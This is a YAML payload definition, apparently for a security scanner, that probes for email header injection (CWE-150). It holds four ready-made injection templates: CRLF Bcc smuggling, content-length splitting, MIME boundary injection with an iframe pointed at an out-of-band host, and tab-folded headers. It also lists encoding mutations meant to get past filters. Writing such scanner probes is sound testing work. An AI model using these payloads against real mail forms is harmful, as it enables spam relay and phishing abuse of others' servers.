family_id: smtp_injection
description: >-
  Email header injection probes (CWE-150). Bcc injection, CRLF response
  splitting, and Content-Type boundary injection for MIME attacks.
cwe_ids: [150]
owasp_top10:
  - 'A03:2021'
risk_level: medium
requires_approval: false
oast_required: true
payloads:
  - id: bcc_injection
    template: "victim@company.com%0d%0aBcc: {canary}@{oast_host}"
    confidence: suspected
    notes: CRLF Bcc header injection; appends blind-carbon-copy via header smuggling.
  - id: crlf_response_split
    template: "legit@example.com%0d%0aContent-Length: 0%0d%0a%0d%0aSMTP Injection"
    confidence: suspected
    notes: CRLF response splitting in To/From; injects SMTP commands into email stream.
  - id: content_type_boundary
    template: "\r\nContent-Type: multipart/mixed; boundary=--ARGUS_BOUNDARY\r\n\r\n--ARGUS_BOUNDARY\r\nContent-Type: text/html\r\n\r\n<iframe src=//{oast_host}/{canary}>\r\n--ARGUS_BOUNDARY--"
    confidence: suspected
    notes: MIME boundary injection; wraps HTML payload inside multipart boundary smuggling.
  - id: header_multiline_fold
    template: "legit@example.com%0d%0a%09Bcc: {canary}@{oast_host}"
    confidence: suspected
    notes: Header folding injection via tab (%09); continuation lines bypass naive filters.
mutations:
  - name: crlf_encoding
    description: Rotate through %0d%0a, %0a, \r\n literal variants for CR/LF bypass.
  - name: header_rotation
    description: Swap injected headers across Bcc, Cc, Reply-To, Return-Path targets.
encodings:
  - name: identity
    stages: []
    description: Raw email header value with CRLF sequences.
  - name: url_only
    stages: [url]
    description: URL-encoded CRLF sequences in form-submitted email fields.
